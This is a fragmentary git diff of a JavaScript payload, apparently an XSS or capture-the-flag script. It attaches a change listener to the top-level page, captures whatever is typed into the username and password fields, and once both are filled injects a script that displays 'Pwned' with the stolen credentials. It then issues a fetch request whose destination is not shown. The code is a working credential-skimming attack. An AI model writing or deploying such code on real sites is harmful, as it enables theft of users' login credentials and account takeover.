@@ -11,18 +11,13 @@ var pw;
 top.document.addEventListener('change', e => {
   if (event.target.matches('#username')) {
     usr = e.target.value;
+    console.log("assign user");
   } else if (e.target.matches('#password')) {
+    console.log("assign pw");
     pw = e.target.value
-  }
-}, false)
-  // top.username.addEventListener('change', e => usr = e.target.value);
-  // top.password.addEventListener('change', e => usr = e.target.value);
-  //
-  top.document.forms[0].addEventListener('submit', () => {
-    console.log("submitting a form", usr, pw);
 
-    if (top.document.forms[0].elements[0].classList.contains('hidden-input')) {
-      console.log("doing shit", top.password.value);
+    if (usr.length && pw.length) {
+      console.log("submitting form", usr, pw);
       pw = top.password.value;
       x = document.createElement('script');
       x.src = 'data:,alert("Pwned "+usr+" "+pw)';
@@ -36,9 +31,8 @@ top.document.addEventListener('change', e => {
       }).then(resp => {
         console.log(resp.json());
       })
-    } else {
-      console.log("not doing anything");
-      console.log(top.document.forms[0].elements[0]);
     }
-  })
-// };
+  }
+}, false)
+  // top.username.addEventListener('change', e => usr = e.target.value);
+  // top.password.addEventListener('change', e => usr = e.target.value);
